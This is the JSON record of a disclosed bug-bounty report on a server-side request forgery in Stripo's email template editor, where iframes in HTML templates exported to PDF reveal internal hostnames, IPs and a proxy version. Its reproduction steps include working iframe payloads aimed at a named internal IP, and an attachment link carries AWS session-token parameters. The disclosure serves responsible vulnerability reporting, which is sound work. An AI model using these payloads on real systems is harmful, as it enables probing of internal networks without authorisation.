@@ -1,0 +1,124 @@
+{
+  "id": 782979,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODI5Nzk=",
+  "url": "https://hackerone.com/reports/782979",
+  "title": "Information disclosure through Server side resource forgery",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2020-01-25T02:57:14.512Z",
+  "submitted_at": "2020-01-25T02:57:14.512Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "checkm50",
+    "url": "/checkm50",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 42368,
+    "url": "https://hackerone.com/stripo",
+    "handle": "stripo",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/042/368/5b1017d17427be6c8e05cbc95da27646bf45e925_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Stripo Inc",
+      "twitter_handle": "",
+      "website": "https://stripo.email",
+      "about": "Stripo is a lightweight and intuitive email template editor that lets users build professional looking and highly responsive email templates."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2020-01-28T15:48:08.415Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-01-27T17:00:21.901Z",
+  "team_member_agreed_on_going_public_at": "2020-01-28T15:48:08.343Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nThe application https://my.stripo.email has a template feature where can we can enter html code.\nBy including an iframe in the html template, I was able to make a call to my server.\nThis exposed an internally running web application. Please refer below,\n```63.33.82.168 - - [25/Jan/2020:01:49:33 +0000] \"GET /redirect.php HTTP/1.1\" 301 5 \"http://stripe-export-service:8080/v1/download/template/pdf/57764\" \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\"```\n\nNote the IP address and stripe-export-service URL.\n\nIP address is accessible internal only.\n\nI tried to iframe the IP address which I got above and exported as PDF. It had below information,\n```webmaster?subject=CacheErrorInfo - ERR_CONNECT_FAIL&body=CacheHost: proxy-eu.stripo.email\nErrPage: ERR_CONNECT_FAIL\nErr: (111) Connection refused\nTimeStamp: Sat, 25 Jan 2020 01:37:02 GMT\nClientIP: 172.31.5.123\nServerIP: 63.33.82.168\nHTTP Request:\nGET / HTTP/1.1\nProxy-Connection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36\nAccept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nReferer: http://stripe-export-service:8080/v1/download/template/pdf/57763\nAccept-Encoding: gzip, deflate\nHost: 63.33.82.168```\n\nAbove result exposes two things.\n* Proxy host proxy-eu.stripo.email\n* and the version Squid proxy **(squid/3.5.23)**\n\nThis exposure gives more attack surface to an attacker.\n\n## Steps To Reproduce:\n1. Logon to stripo\n2. Head over to creating an email template and choose html option\n3. Use below iframe code to make a call to your server\n<iframe src='your domain'></iframe>\n4. To hit internal IP address and disclose the proxy info, use below iframe\n<iframe src='http://63.33.82.168' height=800 width=800></iframe>\n\n## Supporting Material/References:\nAttaching the PDF I exported with proxy related information\n\n## Impact\n\nExposure of internal web application URL, IP address, Proxy host and the Proxy server Squid version to the attacker gives the attacker more attack surface.",
+  "weakness": {
+    "id": 68,
+    "name": "Server-Side Request Forgery (SSRF)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 695488,
+      "file_name": "New_email-6.pdf",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vj96HBa8opTikAbx696HedLr?response-content-disposition=attachment%3B%20filename%3D%22New_email-6.pdf%22%3B%20filename%2A%3DUTF-8%27%27New_email-6.pdf&response-content-type=application%2Fpdf&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQTRSPJQEY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133616Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIANREuSO5xRo5uYh9p3fj5lFZASOM0CJaqF9aRTyqP1tAiBMs6gYtXIgibXyOqYUXBJZxA%2Fdza4ke6K%2F%2F0b5E9m1RSqwBQh2EAMaDDAxMzYxOTI3NDg0OSIM8OmUCbC3Pqq1SyEDKo0F3cO4ThOa4uitsGZnpJd4WSWYKi0%2F5mL8qwHwgq3ZuZ1aNUqEK3JGtjDNNtehYQzb3K%2BVzvT15T5E0DeN3sE8NL7KIl3i0Dx5W04t%2FCwofuZVDH6Rwez2OIyLRGEiHKo%2FP%2FkbGO6J7x9mVhWTOKS2bFg4igbBGqP%2Bi2aedUT3vluiB7ukP1cc428RmdmCV%2BuhSI6mu%2Fx6zanZ8MjIY1iRcGFyRSvjl0iN9Apkcqbj2H8R4UNg8b2kqipVUPR0IhWE4Repf%2B6oHnySIQcgKlfP60eivKF7%2BDxEpCbVDsb91wMe67XzEaDtj4q3yEkaR59%2FnN0%2Fg51i8gvLHyAK2aB8UWfJhpojdnN%2FB%2BaF6aGM1Zep47eAH4cQQWhMZ2I26LKQhm7iwRj6IEHbgHd2m6nHPOKHU2uWuHo13GDorNeQWMI%2FABbIu1tC%2FBPGMydY2v4uUNIntKjUUw%2BXSGO9A9lk6BbiANo%2BTxvrgKzjhYstigi28K%2FJy2l%2B50z3nW5D8NMHVXHTF9%2FfZJj2T3gBRe9rfchTv6%2Bbpy1%2Bn8nOxmudj%2B9inUeddHC6rtgTt35Y1V%2FQuDeghaOCTLBIQIRUj2dXMLrSvM6ipTuqtOLpxyjWPKhlGteSd9sRZ2GulqFnPco4IJ18%2Fn03rD%2FZTFvntG5nnCfDUN1rKUSiHRLc%2Be2fxn1LToFrzjJFDRvOSJIM%2FpzLFcAYL8tTTyFBkIKfd049EasT8fD7XkmUkbP9SU%2Fz3oask16Cc%2FxTEDv733bE%2B2WRdqbzle4n0HY%2F8WFiXHg%2FcBG11MfaIEqM74wTZ5xO8lGQRD8qVunQROTT4innfbTfWRrrpjWEVYNiOx7p4%2BZ0qgpFMn9%2F3hcTkdABX%2BMwpcOtrgY6sgEIuPpZKWB6MctyieUs6Zf8b%2FX4IKPm%2BfhMeS2tI0il7r2OReIXdjDVkC4sQOPEZhbn%2BDfZAXOoMl6LPgx5C10nOg8D%2BTLxqQZt9rcPO7a6NY6DuIvhZo5c4RdVjEGuOfc%2FAROg4UmbOf0zkue94sBg8VslzPwR4H20rwyBYQqkWxtaGVbZKYCCbNb6IEpuSkgMadMJvwHOmUUOWS2k1Jnl6yQZixJKKroR7DQEK1J3Lebd&X-Amz-SignedHeaders=host&X-Amz-Signature=d60f05f3d5184882c5e1af7981b6ff9f661a5e939e73b71687981875b10be6ce",
+      "file_size": 39183,
+      "type": "application/pdf",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 7,
+  "voters": [
+    "al-madjus",
+    "rook1337",
+    "pirateducky",
+    "exception",
+    "ladybheem",
+    "b9372d4605459ca97219795",
+    "alvaeze"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 38702,
+    "asset_type": "URL",
+    "asset_identifier": "my.stripo.email",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
